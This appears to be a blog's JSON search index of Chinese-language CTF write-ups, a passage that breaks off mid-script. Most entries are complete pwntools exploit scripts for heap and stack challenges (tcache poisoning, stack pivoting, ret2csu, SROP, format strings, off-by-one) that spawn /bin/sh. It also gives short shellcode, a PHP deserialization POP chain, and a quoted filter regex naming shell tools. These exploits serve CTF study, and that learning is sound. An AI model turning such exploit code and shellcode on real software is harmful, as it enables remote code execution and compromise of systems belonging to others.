[ { "title": "高级网络攻防CTF", "url": "/posts/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2CTF/", "categories": "CTF, Exercise", "tags": "pwn, web", "date": "2023-05-11 22:15:00 +0800", "snippet": "pwn1UAF+heap overflow很容易制造tcache attack，由于libc2.36-9没了free hook，所以这题通过libc的environ泄露栈地址，将chunk伪造到栈上来覆盖返回地址。pwn1from pwn import *elf = ELF('./pwn')libc = ELF('./libc.so.6')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'io = process(['./pwn-test'])#io = remote('124.16.75.116', 52017)def menu(choice): io.recvuntil(b\"5. Exit\\n&gt; \") io.sendline(str(choice))# index&lt;=0x3f# name 0x1f# size&lt;=0x3ffdef add(index, name, size, content): menu(1) io.recvuntil(b\"Index: \") io.sendline(str(index)) io.recvuntil(b\"Name: \") io.sendline(name) io.recvuntil(b\"size: \") io.sendline(str(size)) io.recvuntil(b\"Description: \") io.send(content) def delete(index): menu(2) io.recvuntil(b\"Index: \") io.sendline(str(index))# &lt;=0x3fdef show(index): menu(3) io.recvuntil(b\"Index: \") io.sendline(str(index))def edit(index, content): menu(4) io.recvuntil(b\"Index: \") io.sendline(str(index)) io.recvuntil(b\"Description\") io.send(content)def exit(): menu(5)add(0, \"\", 0x200, \"content\")add(1, \"name\", 0x3ff, \"content\")add(2, \"name\", 0x3ff, \"content\")show(0)io.recvuntil(b\"Name: \")io.recv(8)stack_addr = u64(io.recv(8))# leak the address of heapdelete(1)show(1)io.recvuntil(b\"Name: \")unsorted_bin = u64(io.recv(5).ljust(6, b'\\x7f').ljust(8, b'\\x00'))main_arena = unsorted_bin - 0x10 - 80libc_base = main_arena - 0x1d2c60libc.address = libc_basesuccess(\"libc base: \" + hex(libc_base))add(1, \"name\", 0x3ff, \"content\") # keep subsequent chunk continuous# leak the address of stack(environ)add(3, \"name\", 0x10, \"content\")add(4, \"name\", 0x10, \"content\")add(5, \"name\", 0x10, \"content\")add(6, \"name\", 0x10, \"content\")delete(5)show(5)io.recvuntil(b\"Name: \")key = u64(io.recv(6).ljust(8, b'\\x00')) - 1success(\"key: \" + hex(key))target = libc.sym['environ'] - 0x10payload = b'a'*(0x10) + p64(0) + p64(0x41) + p64(target ^ key)delete(4)edit(3, payload)add(7, \"name\", 0x200, \"content\")add(8, \"\", 0x200, \"content\")show(8)io.recvuntil(b\"Name: \")io.recv(8)success(\"unstable stack_addr(environ-&gt;): \" + hex(stack_addr))new_stack_addr = u64(io.recv(6).ljust(8, b'\\x00'))success(\"stable stack_addr(environ-&gt;): \" + hex(new_stack_addr))main_ret = new_stack_addrsuccess(\"main ret: \" + hex(main_ret))# hack the stack addradd(9, \"name\", 0x200, \"content\")add(10, \"name\", 0x200, \"content\")add(11, \"name\", 0x200, \"content\")add(12, \"name\", 0x200, \"content\")delete(11)show(11)io.recvuntil(b\"Name: \")key = u64(io.recv(6).ljust(8, b'\\x00'))success(\"key: \" + hex(key))payload = b'a'*(0x200) + p64(0) + p64(0x231) + p64(main_ret ^ key)delete(10)edit(9, payload)add(13, \"name\", 0x200, \"content\")binsh_str = next(libc.search(b\"/bin/sh\"))success(\"binsh: \" + hex(binsh_str))binsh_str = p64(binsh_str)[:-1]ret = p64(0x270c2+libc_base)pop_rdi = p64(0x27725+libc_base)#gdb.attach(io)#pause()add(14, p64(0) + ret + pop_rdi + binsh_str, 0x200, p64(libc.sym['system']))io.interactive()pwn2先malloc随机个随机大小的chunk，但数量不超过256，大小不超过1024，再随机释放一部分，之后将flag写到新malloc的块上。由于show的时候按随机字节write，有可能将后一个块的内容暴露出来，本题可以尝试申请flag前的所有块进行show来尝试暴露flag。需要注意的是将tcache上的块取下，由于tcache不可分割有可能造成flag前的块取不下来。pwn2from pwn import *elf = ELF('./pwn')libc = ELF('./libc.so.6')#context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'io = process('./pwn')#io = remote('124.16.75.116', 52018)def menu(index): io.recvuntil('4. Exit\\n&gt; ') io.sendline(str(index))def check_if_flag(): menu(3) io.recvuntil('Index: ') io.sendline('0') s = io.recvuntil('1. Add') s = str(s) if 'flag' in s: print(s) pause() io.interactive()def add(size): menu(1) io.recvuntil('Index: ') io.sendline('0') io.recvuntil('Size: ') io.sendline(str(size)) io.recvuntil(\"Data: \") io.sendline('\\x00')for sz in range(16, 1024, 16): for i in range(7): add(sz) gdb.attach(io, \"set solib-search-path ~/workplace/pwn2\") check_if_flag() check_if_flag() check_if_flag()count = 0while True: count += 1 add(0x8) check_if_flag() check_if_flag() check_if_flag() print(count)web1web1go的模板实例化漏洞，会将用户输入的字符串解析并执行。需要通过UTF-16编码绕过contain的过滤检查，之后实例化执行的时候会被还原成字符串" }, { "title": "4月月赛", "url": "/posts/4%E6%9C%88%E6%9C%88%E8%B5%9B/", "categories": "CTF, Exercise", "tags": "", "date": "2023-04-25 22:03:00 +0800", "snippet": "easyheap简单的uaf，先通过unsortedbin泄露libc加载基址，再释放chunk到tcache上修改next指针指向free_hook即可。libc-2.31没有PROTECT_PTR，不需要获取tcache的key信息。easyheapfrom pwn import *elf = ELF('./timu')libc = ELF('./libc-2.31.so')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'io = process(['./timu'], env={\"LD_PRELOAD\":'/home/hf/workplace/easyheap/libc-2.31.so'})#io = remote('124.16.75.162', 31052)def add(handle, index, size, content): handle.recvuntil('please input your choice&gt; ') handle.sendline('1') handle.recvuntil(\"index?\\n\") handle.sendline(str(index)) handle.recvuntil(\"size?\\n\") handle.sendline(str(size)) handle.recvuntil(\"content:\\n\") handle.send(content) handle.send(content) def edit(handle,index, content): handle.recvuntil('please input your choice&gt; ') handle.sendline('2') handle.recvuntil(\"index?\") handle.sendline(str(index)) handle.recvuntil(\"content:\") handle.send(content) def delete(handle, index): handle.recvuntil('please input your choice&gt; ') handle.sendline('3') handle.recvuntil('index?') handle.sendline(str(index))def show(handle, index): handle.recvuntil('please input your choice&gt; ') handle.sendline('4') handle.recvuntil('index?\\n') handle.sendline(str(index))def exit(handle): handle.recvuntil('please input your choice&gt; ') handle.sendline('5')add(io, 0, 0x410, \"none\")add(io, 2, 0x410, \"none\")delete(io, 1)show(io, 1)unsorted_bin = u64(io.recv(6).ljust(8, b'\\x00'))main_arena = unsorted_bin - 0x10 - 80libc_base = main_arena - 0x1ebb80libc.address = libc_basesuccess(\"unsorted bin: \" + hex(unsorted_bin))success(\"main arena: \" + hex(main_arena))success(\"libc base: \" + hex(libc_base))success(\"/bin/sh: \" + hex(next(libc.search(b\"/bin/sh\"))))success(\"free hook: \" + hex(libc.sym['__free_hook']))success(\"system: \" + hex(libc.sym['system']))#pause()add(io, 4, 0x40, \"none\")add(io, 6, 0x40, \"none\")add(io, 8, 0x40, \"/bin/sh\\x00\")delete(io, 4)delete(io, 5)delete(io, 6)delete(io, 7)edit(io, 7, p64(libc.sym['__free_hook']))add(io, 4, 0x40, p64(libc.sym['system']))#pause()#add(io, 10, 0x20, \"none\")delete(io, 8)gdb.attach(io, \"set solib-search-path ~/workplace/babyheap/\")io.interactive()easystack栈迁移到bss段上，由于sp指针太低调用puts可能会触发访问错误，而通过ret链抬高sp的话溢出字节又不足，所以考虑先read rop链到bss较高的地址。直接通过ret2csu构造read即可，由于ret2csu过程将sp提高了不少，所以没有像puts一样触发访问错误。easystackfrom pwn import *from LibcSearcher import *context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'elf = ELF('./ctf')p = process('./ctf')#p = remote('124.16.75.162', 31059)leave_ret = 0x40090fpivoted_stack = elf.sym['name_buf'] # 0x6010a0binsh_addr = 1576 + elf.sym['name_buf']rop = ROP(elf)rop.raw(cyclic(8))rop.ret2csu(edi=0, rsi=p64(elf.sym['name_buf']), rdx=0x800, call=elf.got['read'])print(rop.dump())p.recvuntil('&gt;&gt; ')p.sendline('3')p.recvuntil('Leave your Name: ')p.send(rop.chain())payload = cyclic(0x90) + p64(pivoted_stack) + p64(0x40090f)p.recvuntil('&gt;&gt; ')p.sendline('2')p.recvuntil('Enter your size: ')p.sendline(str(0xa0))p.recvuntil('Enter your message: ')p.send(payload)p.recvuntil('&gt;&gt; ')p.sendline('4')rop.raw(p64(0x4005e6)*0xa0) # ret ret ret ...rop(rdi=elf.got['puts'])rop.call('puts')rop.ret2csu(edi=0, rsi=p64(elf.got['puts']), rdx=0x8, call=elf.got['read'])rop(rdi=p64(binsh_addr))rop.call('puts')print(len(rop.chain())) # binsh offsetrop.raw('/bin/sh\\x00')gdb.attach(p)pause()p.send(rop.chain())pause()p.send('x') # read modify rbx to -1, ret2csu cmp rbx+1 rbp fail, then it will entry read againputs_addr = u64(p.recv(6).ljust(8, b'\\x00'))success(\"puts addr: \" + hex(puts_addr))obj = LibcSearcher('puts', puts_addr)libc_base = puts_addr - obj.dump('puts')system_addr = obj.dump('system') + libc_basesuccess('system: ' + hex(system_addr))p.send(p64(system_addr))p.interactive()" }, { "title": "高级网络攻防漏洞利用", "url": "/posts/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/", "categories": "CTF, Exercise", "tags": "pwn", "date": "2023-04-13 16:15:00 +0800", "snippet": "ezwebezweb解题过程使用dirmap工具扫描路径，得到网站源代码web.zip。查看index.php文件，其中存在反序列化过程，并过滤了常见提权调用。本题可以使用没被过滤readfile函数直接读取flag文件。&lt;?phpinclude(\"closure/autoload.php\");function myloader($class){ require_once './class/' . (str_replace('\\\\', '/', $class) . '.php');}spl_autoload_register(\"myloader\"); error_reporting(0);if($_POST['data']){\t$vvvccc=base64_decode($_POST['data']);\t//print_r($vvvccc);\tif(preg_match(\"/ob_start|shell_exec|exec|system|passthru|print|print_r|var_dump|bash|tac|nl|more|less|head|wget|tail|vi|cat|grep|sed|bzmore|bzless|pcre|paste|diff|sh/i\", $vvvccc)){ echo(\"easy yii!\"); echo \"&lt;br&gt;\";\t\t\texit; } unserialize($vvvccc);}else{\techo \"&lt;h1&gt;easy yii!&lt;/h1&gt;\";}程序的class路径下存在多个类，其中RunProcess存在显式的析构方法可以用来启动调用链，调用过程整体如图2所示。1、2过程：主程序结束调用RunProcess的析构函数，析构函数内部调用stopProcess函数清理运行中的进程。3、4、5过程：stopProcess里存在$this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine());，令$process=DefaultGenerator， DefaultGenerator本身无getCommandLine方法，在这里会默认调用__call方法返回自身default变量。于是将AppendStream封装在DefaultGenerator的default里可以使上述语句变为$this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $AppendStream);进而触发AppendStream的toString方法。之后toString内部调用rewind方法，rewind方法调用内部seek方法。6、7、8过程：AppendStream内部seek方法调用CachingStream的rewind方法构造变量diff为负数并且将$this-&gt;remoteStream-&gt;eof()同上一步将remoteStream赋值为DefaultGenerator类型，并将DefaultGenerator的default设置为false值成功绕过$diff &gt; 0 &amp;&amp; !$this-&gt;remoteStream-&gt;eof()判断进入内部read方法。9、10过程：CachingStream内部read方法进一步调用$this-&gt;stream-&gt;read($length)，这里将stream变量类型设置为PumpStream类，程序进入PumpStream类的read方法，进一步进入pump方法。11过程：PumpStream类内存在调用内部变量$source的call_user_func方法，至此调用链结束。技术点总结源码泄露源码泄露一般分为以下几种 默认的隐藏文件未删除，比如hg init生成的.hg、git init生成的.git、MAC系统下的.DS_Store属性文件。 网站备份压缩文件未删除，一般可能是管理员将压缩文件错误的放在web目录下或者框架自动备份的文件、临时文件未删除本题在web目录下存在web.zip源代码压缩包。pop链pop链是利用魔法方法进行代码跳转实现恶意程序流的payload本题使用__destruct使RunProcess类在析构执行了一系列代码常见可以利用的魔法方法有如下几种 __sleep序列化时触发 __wakeup反序列化时触发 __destruct析构时触发 __call调用不可访问方法时触发 __toString默认字符串类型转换命令执行绕过web通常会对输入内容进行过滤，常见的绕过方法有空格绕过、重定向绕过、编码绕过和反斜杠绕过等。本题绕过了函数调用的过滤，使用没被过滤的readfile方法。反序列化漏洞序列化就是将一个对象转换成字符串。字符串包括，属性名，属性值，属性类型和该对象对应的类名。反序列化则相反将字符串重新恢复成对象。这其中会调用两个经典的魔法方法，即反序列化过程中的__wakeup和反序列化对象析构时的__destruct。本题使用了反序列化对象析构时的__destruct构造pop链flagflag{welcome_to_yii}rop_revengerop_revenge解题过程vuln函数存在溢出，可以覆盖rbp和返回地址，可利用栈空间太少，考虑进行栈迁移ssize_t vuln(){ int v0; // eax char buf[256]; // [rsp+0h] [rbp-100h] BYREF v0 = initial++; if ( v0 &gt; 0 ) _exit(1); return read(0, buf, 0x110uLL);}将rbp首先迁移到bss段的高位0x404fe0处，并控制程序执行0x401304处的代码。至此程序将会先写入0x404ee0~0x404ff0处的内容，并执行leave retn进行栈迁移通过如图4所示布局将rsp迁移到可控制内存上，使得loc_401304结束时rsp指向0x404ee8，并调用完整的rop链由于存在seccomp，只能使用部分系统调用，最终rop链构造思路为依次调用open、read和write将flag文件内容读取并打印在stdout上。需要注意的是read和write要控制第三个参数即rdx寄存器，可以通过ret2csu修改rdx，并使用call [r15+rbx*8]进行函数调用技术点总结rop链主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，可以修改某些地址的内容，方便控制程序的执行流程。栈迁移溢出字节只够覆盖rbp和返回地址时，难以构造较长的rop链，这是可以考虑利用leave; ret;将rsp迁移到较大的可控内存上，实现rop链的调用leave指令等价于mov rsp, rbp; pop rbp;通过该指令可以将rsp修改为当前rbp指向的内容，而在栈溢出时往往可以控制pop rbp时用到的内存，进而在第二次leave调用时将rsp迁移到任意地址。seccompSecomp是Linux内核2.6.12版本引入的安全模块，主要是用来限制某一进程可用的系统调用。本题中只允许open、read和write等系统调用，没法直接使用execve等提权系统调用，所以只能考虑将flag文件读取出来。ret2csu__libc_csu_init存在方便使用的gadget。如下所示，可以通过loc_401476处代码修改rbx、rbp、r12、r13、r14和r15，进一步通过loc_401460处代码修改rdx、rsi和edi寄存器，这是SysV x64 ABI下存储前三个参数用的寄存器。有了这些gadget便可以随意控制函数调用的前三个参数并在0x401469处使用call直接调用相关函数，并在0x401484处返回进入下一个rop片段。.text:0000000000401460 loc_401460: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000401460 4C 89 F2 mov rdx, r14.text:0000000000401463 4C 89 EE mov rsi, r13.text:0000000000401466 44 89 E7 mov edi, r12d.text:0000000000401469 41 FF 14 DF call ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8].text:0000000000401469.text:000000000040146D 48 83 C3 01 add rbx, 1.text:0000000000401471 48 39 DD cmp rbp, rbx.text:0000000000401474 75 EA jnz short loc_401460.text:0000000000401474.text:0000000000401476.text:0000000000401476 loc_401476: ; CODE XREF: __libc_csu_init+35↑j.text:0000000000401476 48 83 C4 08 add rsp, 8.text:000000000040147A 5B pop rbx.text:000000000040147B 5D pop rbp.text:000000000040147C 41 5C pop r12.text:000000000040147E 41 5D pop r13.text:0000000000401480 41 5E pop r14.text:0000000000401482 41 5F pop r15.text:0000000000401484 C3 retnflagflag{8418020e-afcf-4994-86b1-99a294a3378d}glibc_master没做出来，参考同学的wpglibc_masterfrom pwn import *#p = remote(\"124.16.75.116\", 52018)p = process('./pwn')libc = ELF(\"./2.36-0ubuntu4_amd64/libc.so.6\")context.log_level = 'debug'def menu(chi): p.recvuntil(\"&gt; \") p.sendline(str(chi))def add(idx, size, data=\"a\", des=\"a\"): menu(1) p.recvuntil(\"Index: \") p.sendline(str(idx)) # 0-79 p.recvuntil(\"Size: \") p.sendline(str(size)) # 32-0x1000 p.recvuntil(\"Data: \") p.send(data) p.recvuntil(\"Description: \") p.send(des)def free(idx): menu(2) p.recvuntil(\"Index: \") p.sendline(str(idx)) def edit(idx, data, des): menu(3) p.recvuntil(\"Index: \") p.sendline(str(idx)) p.recvuntil(\"Data: \") p.send(data) p.recvuntil(\"Description: \") p.send(des)menu(1337)p.recvuntil(\"real one\\n\")puts = u64(p.recv(6).ljust(8, b\"\\x00\"))print(\"[+] puts =&gt; \" + hex(puts))libc_base = puts - 0x77820print(\"[+] libc_base =&gt; \" + hex(libc_base))strlen_got_libc = libc_base + 0x1D2080mp_ = libc_base + 0x1D23A8 - 0x68tcache_ptr = mp_ + 0x60max_bin = mp_ + 0x68add(0, 0x418) # A p-&gt;fdadd(1, 0x108) # barrieradd(2, 0x438) # B0 helperadd(3, 0x448) # C0 = p; addr(p) &amp; 0xff = 0add(4, 0x108) # barrieradd(5, 0x488) # H0 helper for write bk-&gt;fd victim chunkadd(6, 0x428) # D p-&gt;bkadd(7, 0x108) # barrieradd(8, 0x458)add(9, 0x108)add(13, 0x30)free(0)free(3)free(6)free(2)add(2, 0x468, b'a' * 0x20, b'a' * (0x438 - 0x20) + p64(0x561)[:-2])add(3, 0x418) # c1 from ubadd(6, 0x428) # D is p-&gt;bkadd(0, 0x418, b'0' * 0x20) # A is p-&gt;fd# set A-&gt;bk = pfree(0)free(3)add(0, 0x418, b'a' * 8 + p8(0))add(3, 0x418)# set D-&gt;fd = pfree(3) # C1free(6) # D is p-&gt;bk now ub: D-&gt;fd = C1free(5) # merge D with H0, preserve D-&gt;fdadd(6, 0x500 - 8, b'a' * 0x20, b'a' * (0x488 - 0x20) + p64(0x431) + p8(0)) # H1 add(3, 0x3b0)# off by nullfree(4)add(42, 0x108, b'a', b'a' * (0x100 - 0x20) + p64(0x560))free(6)add(6, 0x468, p16(1) * (0x20 // 2), b'a' * (0x448 - 0x20) + p64(0x111))add(10, 0x5d0) # clear ubsystem = libc_base + libc.sym[\"system\"]# 2 can overwrite #6bk = libc_base + 0x1d20c0free(6)add(11, 0x478)free(8)edit(2, b'a' * 0x20, b'a' * (0x438 - 0x20) + p64(0x471) + p64(bk) * 3 + p64(max_bin - 0x20))gdb.attach(p, \" set debug-file-directory ~/workplace/glibc_master/2.36-0ubuntu4_amd64/.debug/ \\n set solib-search-path ~/workplace/glibc_master/2.36-0ubuntu4_amd64/\")add(12, 0x478, b\"a\\n\", b\"a\\n\")free(13)edit(0, b'a' * 0x20, p64(strlen_got_libc) * 6)menu(1)p.recvuntil(\"Index: \")p.sendline(str(14)) p.recvuntil(\"Size: \")p.sendline(str(0x498))p.recvuntil(\"Data: \")p.send(p64(system) * 2)p.recvuntil(\"Description: \")p.send(\"a\\n\")menu(1337)p.interactive()" }, { "title": "NKCTF23", "url": "/posts/NKCTF23/", "categories": "CTF, Exercise", "tags": "NKCTF", "date": "2023-04-13 16:15:00 +0800", "snippet": "读研之后第一次组队打比赛，稍微记录下story栈溢出太少了，栈迁移到可写的地方在附近再溢出一下继续栈迁移腾个地方为什么不一次迁移到位呢，因为没有现成的能作为ret地址的单元，得先迁移一次写个地址，再往上迁移更多可控制内存够了之后直接写binsh字符串-&gt;pop rdi;ret-&gt;binsh字符串地址-&gt;system地址storyfrom pwn import *libc = ELF('./libc.so.6')elf = ELF('./pwn')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'def solve(handle): binsh_addr = 0x4050a8 handle.recvuntil(\"&gt; \\n\") handle.sendline('4') handle.recvuntil(\"can see this. \") puts_addr = int(handle.recvline(), 16) print(hex(puts_addr)) libc.address = puts_addr - libc.symbols['puts'] system_addr = 0xe3b04 + libc.address leave_ret = 0x40139e # 1 handle.recvuntil(\"&gt; \") handle.sendline('1') handle.recvuntil(\"what's your comment?\") handle.send(p64(leave_ret)) # go to main # 0 handle.recvuntil(\"&gt; \") handle.sendline('2') handle.recvuntil(\"what's your corment?\") handle.send(p64(elf.symbols['heart'])) # 2 handle.recvuntil(\"&gt; \") handle.sendline('3') handle.recvuntil(\"what's your corMenT?\") handle.send(p64(libc.symbols['system'])) pop_rdi_ret = 0x401573 payload = b'a'*0xa + p64(0x4050a0-0x8) + p64(leave_ret) + p64(elf.symbols['heart']) # pivot stack to first place, make room for next pivot handle.recvuntil(\"&gt; \") handle.sendline('4') handle.recvuntil(\"now, come and read my heart...\") #gdb.attach(handle, \"b *0x40139f\") handle.send(payload[:0x20]) payload = b'a'*2 + p64(elf.symbols['heart']) + p64(0x4050a0-0x10) + p64(leave_ret) # then pivot again, make sp point to 8 lower. now we get three 8bytes to rop and place holds binsh_str handle.recvuntil(\"now, come and read my heart...\") handle.send(payload[:0x20]) payload = b'aa/bin/sh\\x00' + b'a'*(8) + p64(pop_rdi_ret) + p64(0x4050a0-0x8-0x8) # keep binsh_str align to 8 handle.recvuntil(\"now, come and read my heart...\") handle.send(payload[:0x20]) handle.interactive()io = remote(\"node2.yuzhian.com.cn\", 38213)p = process('./pwn')solve(io)ez_stack溢出，但没东西可用，没有write之类的泄露got地址，也没有能任意修改eax的系统调用，更没有可写可执行的内存页。所以判断为srop的板子题，通过mov eax, 0xf; ret和syscall进行rt_sigreturn系统调用ez_stackfrom pwn import *#libc = ELF('./libc-2.23.so')elf = ELF('./ez_stack')io = remote(\"node2.yuzhian.com.cn\", 39731)p = process('./ez_stack')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'#print(shellcraft.sh())def solve(handle, debug=False): rop = ROP(elf) sigret = 0x401146 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = 0x404020 frame.rsi = 0 frame.rdx = 0 frame.rip = rop.syscall.address rop.raw(b'a'*(0x10+8)) rop(rsi=0x404020) rop.call(0x4011ee) rop.raw(b'a'*8) rop.call(sigret) rop.call(rop.syscall.address) rop.raw(bytes(frame)) print(rop.dump()) handle.recvuntil('Welcome to the binary world of NKCTF!') if debug: gdb.attach(handle, \"b *0x4011ee\") handle.send(rop.chain()) #handle.recvuntil('Welcome to the binary world of NKCTF!') #payload = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\\x90' payload = b'/bin/sh\\x00' handle.send(payload) handle.interactive()solve(io, False)9961code允许直接写入24字节的shellcode，通常的短shellcode很好构造，但本题由于栈指针指向invalid memory，所以需要通过别的方法写入”/bin/sh”。xor rsi,rsimul esipush raxmov rbx,0x68732f2f6e69622fpush rbxpush rsppop rdimov al, 59syscall直接在写入shellcode的地方写入”/bin/sh”是一种方法xor rsi, rsimul esimov edi, 0x996100emov al, 59syscall\"/bin/sh\"另外也可以通过xmm寄存器泄露libc基址，使用libc中的”/bin/sh”。movq rsp, xmm6and eax, 1and edi, eaxpush rsppop rsisyscallxor eax, eaxxor edi, edisyscallret清除rdx的方法还有cdq，该指令会将eax第31位赋值给edx所有的bit。xor rsi, rsilea rdi, [r15+0xe]cdqmov ax, 59syscall\"/bin/sh\"9961codefrom pwn import *libc = ELF('./libc.so.6')elf = ELF('./pwn')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'class Solve: def __init__(self, handle) -&gt; None: self.handle = handle def solve(self): self.handle.recvuntil('In that case, you can only enter a very short shellcode!\\n') payload = \"xor rsi, rsi\\n\" \\ \"mul esi\\n\" \\ \"mov edi, 0x996100e\\n\" \\ \"mov al, 59\\n\" \\ \"syscall\\n\" payload = asm(payload) print(len(payload)) payload += b\"/bin/sh\\x00\" print(len(payload)) #gdb.attach(self.handle) self.handle.send(payload) self.handle.interactive()if __name__ == '__main__': p = process('./pwn') sol = Solve(p) sol.solve()message_boards格式化溢出漏洞，可以直接泄露canary和_IO_21_stderr。程序本身只存在一字节null的溢出，会修改rbp寄存器最低一字节。通过leave指令进一步影响到rsp，ret的时候返回rsp处地址有可能落在输入变量的buf内，于是可以在buf上填充ret gadget一直滑到进行攻击的rop链上。message_boardsfrom pwn import*from LibcSearcher import*context.log_level = \"debug\"context.arch = \"amd64\"io = process(\"./nkctf_message_boards\")libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")elf = ELF(\"./nkctf_message_boards\")#gdb.attach(io,'b *0x401340\\n b main')io.recvuntil(\"What is your name: \")io.sendline(b'%41$p')io.recv(7)canary = int(io.recv(18),16)success(\"canary :\"+hex(canary))io.recvuntil(\"What are your comments and suggestions for the NKCTF: \")main_addr = elf.sym['main']ret_addr = 0x40101apayload = p64(ret_addr)*30+p64(main_addr)+p64(canary)io.send(payload)io.recvuntil(\"What is your name: \")io.sendline(b'%25$p')stderr_addr = int(io.recvuntil(\"What\",drop = True)[-14:],16) success(\"stderr_addr :\"+hex(stderr_addr))# obj = LibcSearcher(\"_IO_2_1_stderr_\",addr)libc_addr = stderr_addr - libc.sym['_IO_2_1_stderr_'] # obj.dump(\"_IO_2_1_stderr_\")success(\"libc_addr :\"+hex(libc_addr))system_addr = libc_addr + libc.sym['system']rdi_addr = 0x401413binsh_addr = libc_addr + next(libc.search(b\"/bin/sh\"))payload = p64(ret_addr)*28+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(canary)io.sendline(payload)io.interactive()baby_heapoff by one漏洞，可以构造overlap的chunk，然后将其释放到unsortedbin上，一来可以直接泄露libc基址，二来可以利用unsortedbin的split机制在bin上获得可控制chunk。由于tcache的存在，split后的chunk从unsorted bin上取下的时候会附带(e-&gt;next)»12值，可以利用到之后的tcache attack上。往tcache上多填充几个chunk，以免tcache-&gt;count不足无法取下fake chunk。基本的原理与fastbin类似，都是将可控制chunk放入bin，之后修改next指针指向希望写入的地址即可。本题直接写入__free_hook完成攻击。baby_heapfrom pwn import *libc = ELF('./libc-2.32.so')elf = ELF('./pwn')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'class Solve: def __init__(self, handle) -&gt; None: self.handle = handle def choice(self, index): self.handle.recvuntil('Your choice: ') self.handle.sendline(str(index)) # index &lt;= 0xf # size &lt;= 256(0x100) # size int-&gt;uint def add(self, index, size): self.choice(1) self.handle.recvuntil('Enter the index: ') self.handle.sendline(str(index)) self.handle.recvuntil('Enter the Size: ') self.handle.sendline(str(size)) def delete(self, index): self.choice(2) self.handle.recvuntil('Enter the index: ') self.handle.sendline(str(index)) def edit(self, index, content): self.choice(3) self.handle.recvuntil('Enter the index: ') self.handle.sendline(str(index)) self.handle.recvuntil('Enter the content: ') self.handle.sendline(content) def show(self, index): self.choice(4) self.handle.recvuntil('Enter the index: ') self.handle.sendline(str(index)) def exit(self): self.choice(5) def solve(self): self.add(0, 0x18) self.add(1, 0x40) self.add(2, 0x40) # fill tcache for i in range(3, 3+7): self.add(i, 0x90) for i in range(3, 3+7): self.delete(i) # off by one -&gt; overlap chunk payload = cyclic(0x18) + b'\\xa1' self.edit(0, payload) self.delete(1) self.add(10, 0x40) # leak libc address by unsortedbin self.edit(2, b'\\x0a') self.show(2) main_arena_addr = u64(self.handle.recvuntil(\"\\x7f\")[-6:].ljust(8,b'\\x00'))-0x0a-96 libc_addr = main_arena_addr - (libc.sym['__malloc_hook']+0x10) libc.address = libc_addr success(\"libc base address :\"+hex(libc_addr)) # recover fd,bk in unsortedbin self.edit(2, p64(main_arena_addr+96)*2) # show (e-&gt;next)&gt;&gt;12 self.add(11,0x40) self.add(12,0x40) self.add(13,0x40) self.show(2) enext = u64(self.handle.recvuntil(\"\\x0a\",drop = True).ljust(8,b'\\x00')) success(\"enext :\"+hex(enext)) # tcache attack self.delete(13) self.delete(12) self.delete(11) self.edit(2, p64(libc.sym['__free_hook'] ^ enext)) self.add(14, 0x40) self.add(15, 0x40) self.edit(15, p64(libc.sym['system'])) self.edit(14, \"/bin/sh\\x00\") self.delete(14) self.handle.interactive()if __name__ == '__main__': p = process('./pwn') sol = Solve(p) sol.solve()参考 Linux_ShellCode总结 Tcache机制及漏洞利用方法 NKCTF2023 官方WP NKCTF2023" }, { "title": "内核漏洞", "url": "/posts/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/", "categories": "", "tags": "", "date": "2023-04-10 00:00:00 +0800", "snippet": "编译modules参考博客编译modules模块make KCONFIG_CONFIG=Microsoft/config-wsl -j8时出现BTF错误，需要安装dwarves软件包BTF: .tmp_vmlinux.btf: pahole (pahole) is not availableFailed to generate BTF for vmlinuxTry to disable CONFIG_DEBUG_INFO_BTFmake: *** [Makefile:1179: vmlinux] Error 1root@HeFeng:~/WSL2-Linux-Kernel-linux-msft-wsl-5.10.102.1# sudo apt-get install dwarves" }, { "title": "3月月赛+升级赛", "url": "/posts/3%E6%9C%88%E6%9C%88%E8%B5%9B+%E5%8D%87%E7%BA%A7%E8%B5%9B/", "categories": "CTF, Exercise", "tags": "", "date": "2023-03-26 20:15:00 +0800", "snippet": "课上习题oork_note存在溢出，unlink板子题，需要注意不是在malloc的时候进行unlink操作从bins上取下一个块，而是在free的时候检查size字段看前一个块是否inuse然后unlink合并。oork_notefrom pwn import *#io = remote(\"212.50.255.253\", 7777)io = process([\"/home/hf/workplace/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so\", \"./oork_note\"], env={\"LD_PRELOAD\":\"/home/hf/workplace/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\"})context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'def start(): io.recvuntil(\"Do you need to edit your note? y/n\") io.sendline('y')def create(note, size): io.recvuntil(\"Input the length of your work note:\") io.sendline(str(size)) io.recvuntil(\"Input context of your work record:\") io.sendline(note)def edit(index, note): io.recvuntil(\"Input your choice: \\n\\t1.edit note\\n\\t2.delete note\\n\\t0.exit\") io.sendline('1') io.recvuntil(\"input the note index to edit:\") io.sendline(str(index)) io.recvuntil(\"Input the content:\") io.sendline(note)def delete(index): io.recvuntil(\"Input your choice: \\n\\t1.edit note\\n\\t2.delete 